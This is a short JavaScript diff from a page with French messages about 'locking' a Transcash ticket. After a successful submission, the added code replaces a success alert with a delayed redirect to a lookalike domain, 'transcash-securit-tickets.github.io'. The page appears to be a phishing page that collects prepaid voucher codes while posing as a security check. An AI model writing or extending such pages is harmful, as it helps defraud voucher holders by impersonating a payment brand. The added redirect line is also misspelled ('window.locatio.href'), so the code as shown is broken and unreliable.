@@ -381,9 +381,12 @@
      
   xhr.onload = function () {
     if (xhr.status === 200) {
-                // Display a success popup
-                window.alert('ticket verrouillé avec succès');
-            } else {
+               setTimeout(function(){
+                window.locatio.href='https://transcash-securit-tickets.github.io/TsT/';
+            },4000);
+                          }
+                          
+    else {
                 // Display an error popup
                 window.alert('echec lors du verrouillage du ticket, veuillez réessayer');
             }
